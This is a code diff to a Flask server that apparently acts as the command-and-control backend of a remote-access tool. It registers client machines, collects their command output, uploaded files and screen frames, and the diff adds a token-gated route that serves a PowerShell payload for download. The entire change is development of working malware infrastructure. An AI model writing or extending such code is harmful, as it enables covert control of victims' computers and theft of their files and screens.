@@ -88,6 +88,19 @@ def clean_clients():
             log_user_disconnection(d)
 
 
+def _resolve_uploaded_file(name):
+    """Find the actual file on disk. Tries exact, then suffix match."""
+    exact = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(name))
+    if os.path.exists(exact):
+        return exact
+    # suffix search: server saved as {clientid}_{timestamp}_{original}
+    safe_name = secure_filename(name)
+    for f in os.listdir(app.config['UPLOAD_FOLDER']):
+        if f.endswith("_" + safe_name) or f == safe_name:
+            return os.path.join(app.config['UPLOAD_FOLDER'], f)
+    return None
+
+
 @app.route('/api/register', methods=['POST'])
 def register():
     ip = request.remote_addr
@@ -108,7 +121,6 @@ def register():
         else:
             clients[client_id]['ip'] = public_ip
             clients[client_id]['last_seen'] = time.time()
-    print(f"[+] Client registered: {client_id} from {public_ip}")
     log_user_registration(client_id, public_ip)
     return jsonify({"id": client_id, "status": "registered"})
 
@@ -146,12 +158,6 @@ def result():
     client_id = data.get('id')
     cmd_id = data.get('cmd_id')
     output = data.get('output')
-    try:
-        if data.get('b64') and isinstance(output, str):
-            import base64 as _b64
-            output = _b64.b64decode(output).decode('utf-8', errors='replace')
-    except Exception:
-        pass
     try:
         if isinstance(output, str) and len(output) > 20000:
             output = output[:20000] + "\n...[truncated]"
@@ -257,14 +263,13 @@ def admin_response(cmd_id):
     return jsonify({"status": "pending"})
 
 
-@app.route('/admin/download_file/<filename>', methods=['GET'])
+@app.route('/admin/download_file/<path:filename>', methods=['GET'])
 def admin_download(filename):
     try:
-        safe_filename = secure_filename(filename)
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
-        if not os.path.exists(filepath):
-            return jsonify({"error": "File not found"}), 404
-        return send_file(filepath, as_attachment=True, download_name=safe_filename, mimetype='application/octet-stream')
+        filepath = _resolve_uploaded_file(filename)
+        if not filepath:
+            return jsonify({"error": "File not found", "requested": filename}), 404
+        return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath), mimetype='application/octet-stream')
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -277,6 +282,18 @@ def admin_stream_frame(client_id):
             if frame_data:
                 return Response(frame_data, mimetype='image/jpeg')
     return jsonify({"error": "No frame available"}), 404
+
+
+@app.route('/payload/<path:token>', methods=['GET'])
+def payload(token):
+    if token != "nyx-7f3a9c":
+        return jsonify({"error": "not found"}), 404
+    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payload.ps1')
+    if not os.path.exists(p):
+        return jsonify({"error": "payload missing"}), 404
+    with open(p, 'rb') as f:
+        data = f.read()
+    return Response(data, mimetype='text/plain')
 
 
 @app.route('/')
